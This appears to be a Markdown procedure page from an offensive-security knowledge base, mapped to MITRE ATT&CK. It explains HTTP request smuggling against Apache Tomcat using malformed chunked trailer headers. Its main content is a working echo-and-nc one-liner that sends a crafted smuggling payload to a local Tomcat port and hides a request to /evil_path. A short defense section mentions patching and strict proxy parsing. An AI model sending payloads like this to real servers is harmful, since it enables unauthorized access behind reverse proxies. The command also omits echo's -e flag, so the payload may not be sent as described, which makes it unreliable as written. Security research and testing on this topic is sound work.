---
tags:
  - exploitation
  - http-request-smuggling
  - payload-crafting
type: procedure
tools:
  - '[[tools/echo]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/echo-nc-send-smuggling-payload]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 760c0a16-0df8-43ce-bcfe-9a929e28d58a
created_at: '2025-12-13T09:01:22.423Z'
updated_at: '2025-12-13T09:01:22.423Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Crafted HTTP Request Smuggling Payload

## Summary

This procedure crafts and sends an HTTP payload exploiting the request smuggling vulnerability in Apache Tomcat by using invalid trailer headers to smuggle an additional request.

## Description

The payload uses chunked encoding with an invalid trailer line lacking a colon, causing Tomcat to skip it and process a smuggled request. This can bypass security when behind a reverse proxy, leading to unauthorized access.

## Requirements

1. Running vulnerable Tomcat instance on localhost:43022
2. Access to shell tools like echo and nc
3. Knowledge of HTTP protocol for payload crafting

## Defense

Defensive measures and detection strategies:

- Upgrade to patched Tomcat versions
- Implement strict HTTP parsing in proxies and monitor for anomalous requests

## Objectives

1. Exploit the trailer header parsing flaw
2. Smuggle a secondary request
3. Demonstrate potential for bypassing security mechanisms

## Instructions

### Step 1: Generate and Send Payload

**Context**: Use echo to create the payload and nc to send it to the server.

**Command** ([[commands/echo-nc-send-smuggling-payload]]):
```bash
echo -n 'POST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n5\r\n12345\r\n0\r\nContent: hello\r\na\r\n\r\nPOST /benign_path HTTP/1.1\r\nHost: a.com\r\nConnection: keep-alive\r\nContent-Length: 37\r\n\r\nGET /evil_path HTTP/1.1\r\nAny: any\r\nHost: b.com\r\n\r\n' | nc 127.0.0.1 43022
```

> This sends the crafted request to trigger smuggling.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/echo-nc-send-smuggling-payload]]

## Tools Used

- [[tools/echo]]
- [[tools/nc]]

## Tags

- [[exploitation]]
- [[http-request-smuggling]]
